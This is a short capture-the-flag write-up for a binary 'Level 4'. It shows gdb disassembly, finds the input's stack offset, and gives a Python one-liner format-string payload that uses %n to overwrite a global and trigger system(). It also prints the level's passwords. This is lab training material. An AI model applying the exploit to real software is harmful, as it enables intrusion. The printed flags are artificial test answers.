## Level 4

level4:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

main:
```
(gdb) disas main 
   0x080484a7 <+0>:     push   ebp
   0x080484a8 <+1>:     mov    ebp,esp
   0x080484aa <+3>:     and    esp,0xfffffff0
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave  
   0x080484b3 <+12>:    ret
```

n:
```
(gdb) disas n
   0x08048457 <+0>:     push   ebp
   0x08048458 <+1>:     mov    ebp,esp
   0x0804845a <+3>:     sub    esp,0x218
   0x08048460 <+9>:     mov    eax,ds:0x8049804
   0x08048465 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:    lea    eax,[ebp-0x208]
   0x08048477 <+32>:    mov    DWORD PTR [esp],eax
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    eax,[ebp-0x208]
   0x08048485 <+46>:    mov    DWORD PTR [esp],eax
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    eax,ds:0x8049810
   0x08048492 <+59>:    cmp    eax,0x1025544
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
```

p:
```
(gdb) disas p
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:     mov    DWORD PTR [esp],eax
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
```

Exploting `printf()` format to overrite the value in the address `0x8049810`

Locating our input on the stack:

Our input is the 12th argument of `printf()`

```
(gdb) disas p
   ...
=> 0x08048450 <+12>:    call   0x8048340 <printf@plt>
   ...
(gdb) x/16x $esp
0xbffff4f0:     0xbffff520      0xb7ff26b0      0xbffff764      0xb7fd0ff4
0xbffff500:     0x00000000      0x00000000      0xbffff728      0x0804848d
0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
```

```
python -c 'import struct; print(struct.pack("I", 0x8049810)+"%01539101x"*11+".%n")'
```

Executing the following command outputs the password for `level5`

```
$ python -c 'import struct; print(struct.pack("I", 0x8049810)+"%01539101x"*11+".%n")' | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
